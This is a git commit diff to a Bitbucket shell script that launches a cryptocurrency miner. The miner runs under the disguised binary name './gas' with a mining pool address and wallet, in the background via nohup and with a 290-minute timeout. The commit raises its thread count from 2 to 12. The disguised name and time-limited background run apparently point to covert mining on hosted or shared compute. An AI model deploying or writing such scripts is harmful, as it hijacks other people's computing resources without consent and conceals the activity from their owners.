96807a009205e06ee0691cafc68bdef8927fe930
sis maryanto <sismaryanto1928@gmail.com>
2021-06-30 03:07:06 +0000

    0.sh edited online with Bitbucket

--- 0.sh
+++ 0.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 POOL=stratum+tcps://stratum-eu.rplant.xyz:17042
 WALLET=sugar1qncwd9uvepk8y3qpp25pjvqunyzjlj44wzhn2as.ahaha
-nohup timeout 290m ./gas -a yespowersugar -o $POOL -u $WALLET -t2 &
+nohup timeout 290m ./gas -a yespowersugar -o $POOL -u $WALLET -t12 &
 jobs
 echo "haha"
 apt-get update -y
